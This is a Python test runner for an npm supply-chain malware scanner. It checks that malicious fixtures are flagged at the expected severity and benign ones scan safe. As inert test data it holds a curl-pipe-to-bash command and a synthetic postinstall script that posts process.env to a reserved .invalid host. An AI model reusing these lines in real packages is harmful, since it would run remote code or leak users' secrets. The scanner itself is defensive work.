#!/usr/bin/env python3
"""Canary + control tests.

Every mal-* fixture must reach its expected level AND fire its expected pattern; every ok-*
fixture (patterns popular packages really use) must scan SAFE. The fixtures are inert: hosts
are reserved (.invalid / TEST-NET) and nothing here is ever executed.

    python tests/run.py
"""
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import npm_audit as na  # noqa: E402

EXPECT = {
    "mal-env-exfil": ("CRITICAL", "env_exfil"),
    "mal-discord-stealer": ("CRITICAL", "credential_exfil"),
    "mal-curl-sh": ("CRITICAL", "download_execute"),
    "mal-inline-node": ("CRITICAL", "inline_install_network"),
    "mal-obfuscated": ("HIGH", "obfuscation"),
    "mal-revshell": ("CRITICAL", "reverse_shell"),
    "mal-wallet": ("HIGH", "wallet_browser_theft"),
    "mal-dns-beacon": ("CRITICAL", "dns_exfil"),
    "mal-worm": ("CRITICAL", "worm_propagation"),
    "mal-wiper": ("CRITICAL", "destructive"),
    # n8n / Node-RED host context
    "mal-n8n-cred-exfil": ("CRITICAL", "automation_credential_exfil"),
    "mal-n8n-enckey": ("CRITICAL", "n8n_internal_secrets"),
    "mal-n8n-undeclared": ("MEDIUM", "n8n_undeclared_credential"),
    "mal-nodered-credstore": ("CRITICAL", "nodered_credential_store"),
    "mal-nodered-admin": ("MEDIUM", "nodered_admin_noauth"),
    "mal-exec-curl": ("CRITICAL", "download_execute"),
    "mal-recon-beacon": ("HIGH", "recon_beacon"),
    "mal-nodered-oauthpath": ("MEDIUM", "nodered_admin_noauth"),
    # added from the DataDog real-malware recall benchmark (RECALL.md)
    "mal-depconf-beacon": ("CRITICAL", "host_fingerprint_exfil"),
    "mal-remote-dep": ("HIGH", "remote_dependency"),
    "mal-encoded-require": ("HIGH", "obfuscation"),
    "mal-eval-response": ("CRITICAL", "download_execute"),
    "mal-hidden-code": ("HIGH", "hidden_code"),
    "mal-gyp-exec": ("CRITICAL", "env_exfil"),
    "mal-spawned-payload": ("CRITICAL", "host_fingerprint_exfil"),
    "mal-wallet-seed": ("HIGH", "wallet_secret_exfil"),
    "mal-charcode-eval": ("HIGH", "obfuscation"),
    "mal-obfio-rotation": ("HIGH", "obfuscation"),
}


# fixtures that must land on an exact level while NOT firing a given rule
PARTIAL = {"ok-n8n-callback": ("HIGH", "automation_credential_exfil")}


def _tarball_check():
    import io, tarfile, tempfile
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, body in (("package/package.json", '{"name":"t","version":"1.0.0","scripts":{"postinstall":"node i.js"}}'),
                           ("package/i.js", "require('https').request({hostname:'c.invalid'}).end(JSON.stringify(process.env))")):
            data = body.encode()
            ti = tarfile.TarInfo(name); ti.size = len(data)
            tf.addfile(ti, io.BytesIO(data))
    with tempfile.NamedTemporaryFile(suffix=".tgz", delete=False) as fh:
        fh.write(buf.getvalue())
    try:
        r = na.audit_tarball(fh.name)
    finally:
        os.unlink(fh.name)
    return r["risk_level"] == "CRITICAL" and r["target"].startswith("t@1.0.0")


def main():
    fails = 0
    root = os.path.join(HERE, "fixtures")
    for name in sorted(os.listdir(root)):
        r = na.scan_package(na.files_from_dir(os.path.join(root, name)), name)
        ids = sorted({f["id"] for f in r["findings"]})
        if name in PARTIAL:
            want, fid = PARTIAL[name]
            ok = r["risk_level"] == want and fid not in ids
        elif name.startswith("mal-"):
            want, fid = EXPECT[name]
            ok = na.SEV_ORDER[r["risk_level"]] >= na.SEV_ORDER[want] and fid in ids
        else:
            want, fid = "SAFE", "-"
            ok = r["risk_level"] == "SAFE"
        fails += not ok
        print("%s %-22s got=%-8s want=%-8s %-24s %s" % (
            "PASS" if ok else "FAIL", name, r["risk_level"], want, fid, ids))
    checks = [
        (na.scan("curl https://x.invalid/a | bash")["risk_level"] == "CRITICAL", "--text pipe-to-shell"),
        (na.scan("const x = require('lodash')")["risk_level"] == "SAFE", "--text benign"),
        (na.split_spec("@scope/pkg@1.2.3") == ("@scope/pkg", "1.2.3"), "split scoped"),
        (na.split_spec("left-pad") == ("left-pad", "latest"), "split bare"),
        (na.detect_ecosystem({"n8n": {"nodes": []}}) == "n8n", "detect n8n field"),
        (na.detect_ecosystem({"keywords": ["n8n-community-node-package"]}) == "n8n", "detect n8n keyword"),
        (na.detect_ecosystem({"node-red": {"nodes": {}}}) == "node-red", "detect node-red field"),
        (na.detect_ecosystem({"keywords": ["node-red"]}) is None, "node-red keyword alone is a library, not a node"),
        (na.detect_ecosystem({"name": "left-pad"}) is None, "detect none"),
        (na.scan_package({"package.json": '{"name":"x"}', "a.html": "<script>eval(atob('Y2FuYXJ5'))</script>"})["risk_level"] == "SAFE",
         "html ignored outside node-red"),
    ]
    checks.append((_tarball_check(), "local .tgz scan (npm pack layout) reads lifecycle scripts"))
    for ok, label in checks:
        fails += not ok
        print("%s %s" % ("PASS" if ok else "FAIL", label))
    print("\n%d failure(s)" % fails)
    return 1 if fails else 0


if __name__ == "__main__":
    sys.exit(main())
